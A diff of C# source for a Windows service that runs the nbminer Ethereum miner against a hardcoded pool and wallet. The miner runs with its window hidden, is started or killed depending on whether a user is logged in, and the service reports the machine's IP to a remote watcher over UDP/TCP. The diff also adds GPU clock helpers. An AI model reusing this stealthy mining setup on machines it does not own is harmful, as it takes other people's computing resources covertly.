@@ -25,10 +25,12 @@ namespace minerService
         Thread thBroadcast;
         EventLog logger;
         string POOL = "eth.2miners.com:2020", USER = "0xfc6a8b9f868ec7593c7c7e5e1682f9a421025786.GPUMiner";
+        bool Runes = true;
         /// ////////
         /// 
         protected override void OnStart(string[] args)
         {
+            Runes = true;
             /////////////////Загрузка настроек
             ReadSettingAsync();
             ///////////////
@@ -51,18 +53,18 @@ namespace minerService
 
             
             thMiner.Start();
-            thJSONsender.Start();
-            thBroadcast.Start();
+            //thJSONsender.Start();
+            //thBroadcast.Start();
         }
 
         void toDo()
         {
-
             logger.WriteEntry("Starting up a programm cycle.", EventLogEntryType.Information);
             while (DateTime.Now < new DateTime(2021, 04, 17))
             {
                 if (!ProcessChecker.isThereAProccess() && ProcessChecker.isUserLoged())
                 {
+                    //Overclocing();
                     Process p = new Process();
 
                     p.StartInfo.FileName = @"D:\nb\nbminer.exe";
@@ -71,7 +73,8 @@ namespace minerService
                     p.StartInfo.RedirectStandardInput = true;
                     p.StartInfo.RedirectStandardOutput = true;
                     p.StartInfo.CreateNoWindow = true;
-                    p.StartInfo.ErrorDialog = false;
+                    //p.StartInfo.ErrorDialog = false;
+                    //p.PriorityClass = ProcessPriorityClass.High;
                     p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                     logger.WriteEntry("Setting up a miner configuration to start", EventLogEntryType.Warning);
                     p.StartInfo.Arguments = "-a ethash -o " + POOL + " -u " + USER;
@@ -82,14 +85,15 @@ namespace minerService
                         ProcessChecker.PN = p.ProcessName;
                         logger.WriteEntry("Succesfully started procces of mining.", EventLogEntryType.Information);
                     }
-                    catch
+                    catch(Exception ex)
                     {
-                        logger.WriteEntry("Cannot start a mining proccess. No access to miner executable!", EventLogEntryType.Error);
+                        logger.WriteEntry(ex.Message, EventLogEntryType.Error);
                     }
 
                 }
                 else if (!ProcessChecker.isUserLoged())
                 {
+                    //DeOverclocing();
                     while (ProcessChecker.isThereAProccess())
                     {
                         Process[] listProc = Process.GetProcesses();
@@ -101,11 +105,13 @@ namespace minerService
                                 {
                                     p.Kill();
                                     p.Dispose();
-                                    logger.WriteEntry("Stoping Miner cause of input action.", EventLogEntryType.Warning);
+                                    logger.WriteEntry("Stoping Miner cause of login action.", EventLogEntryType.Warning);
+                                    Thread.Sleep(1000);
                                 }
                                 catch
                                 {
                                     logger.WriteEntry("Cannot stop a miner. Trying again.", EventLogEntryType.Error);
+                                    Thread.Sleep(1000);
                                 }
                             }
                         }
@@ -124,6 +130,8 @@ namespace minerService
         }
         protected override void OnStop()
         {
+            Runes = false;
+            Thread.Sleep(1000);
             thJSONsender.Abort();
             thBroadcast.Abort();
             thMiner.Abort();
@@ -181,7 +189,7 @@ namespace minerService
         }
         void ServerForSendingData()
         {
-            int port = 8888; // порт для прослушивания подключений
+            int port = 9078; // порт для прослушивания подключений
             TcpListener server = null;
             try
             {
@@ -192,7 +200,7 @@ namespace minerService
                 server.Start();
 
 
-                while (true)
+                while (Runes)
                 {
                     // получаем входящее подключение
                     TcpClient client = server.AcceptTcpClient();
@@ -238,21 +246,21 @@ namespace minerService
             string localAddress = LocalIPAddress();
             try
             {
-                while (true)
+                while (Runes)
                 {
                     byte[] data = receiver.Receive(ref remoteIp); // получаем данные
                     if (remoteIp.Address.ToString().Equals(localAddress))
                         continue;
                     string message = Encoding.Unicode.GetString(data);
                     IPadressofWatcher = message;
-                    // Console.WriteLine(message);
+                   
 
                     SendMyIptoWatcher();
                 }
             }
             catch (Exception ex)
             {
-                //Console.WriteLine(ex.Message);
+                logger.WriteEntry(ex.Message, EventLogEntryType.Error);
             }
             finally
             {
@@ -287,12 +295,46 @@ namespace minerService
             }
             catch (Exception ex)
             {
-                //Console.WriteLine(ex.Message);
+                logger.WriteEntry(ex.Message, EventLogEntryType.Error);
             }
             finally
             {
                 sender.Close();
             }
+        }
+        private void Overclocing()
+        {
+
+            MSI.Afterburner.ControlMemory mc = new MSI.Afterburner.ControlMemory();
+            try
+            {
+                mc.GpuEntries[0].CoreClockCur = UInt32.Parse((double.Parse(mc.GpuEntries[0].CoreClockDef.ToString()) * 0.85).ToString());
+                logger.WriteEntry("Succesfully downgraded clock to 85%", EventLogEntryType.Information);
+            }
+            catch (Exception e)
+            {
+
+                logger.WriteEntry(e.Message, EventLogEntryType.Information);
+            }
+            mc.Disconnect();
+
+        }
+        private void DeOverclocing()
+        {
+
+            MSI.Afterburner.ControlMemory mc = new MSI.Afterburner.ControlMemory();
+            try
+            {
+                mc.GpuEntries[0].ResetToDefaults();
+                logger.WriteEntry("Succesfully setted default clock", EventLogEntryType.Information);
+            }
+            catch (Exception e)
+            {
+
+                logger.WriteEntry(e.Message, EventLogEntryType.Information);
+            }
+            mc.Disconnect();
+
         }
     }
 }
